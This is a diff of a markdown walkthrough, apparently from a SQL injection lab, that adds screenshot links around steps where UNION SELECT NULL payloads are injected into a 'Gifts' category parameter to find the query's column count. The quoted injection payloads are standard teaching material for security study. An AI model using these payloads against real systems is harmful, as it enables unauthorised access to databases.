@@ -138,6 +138,9 @@ We remove the value 'Gifts' and instead inject a payload such as:
 ```
 ' UNION SELECT NULL--
 ```
+
+![Website](/sql-injection/Screenshots/1.1.8sql.png)
+
 #### Testing Column Counts:
 
 - We gradually increase the number of NULL values in the UNION SELECT statement until no error is returned:
@@ -148,6 +151,15 @@ We remove the value 'Gifts' and instead inject a payload such as:
 ' UNION SELECT NULL,NULL,NULL-- → ✅ Success
 ' UNION SELECT NULL,NULL,NULL,NULL-- → Error
 ```
+
+![Website](/sql-injection/Screenshots/1.1.9sql.png)
+
+![Website](/sql-injection/Screenshots/1.1.10sql.png)
+
+![Website](/sql-injection/Screenshots/1.1.11sql.png)
+
+
+
 #### Observing Responses:
 
 - For 1 and 2 columns: The response contains an internal server error or empty result, indicating the number of columns is incorrect.
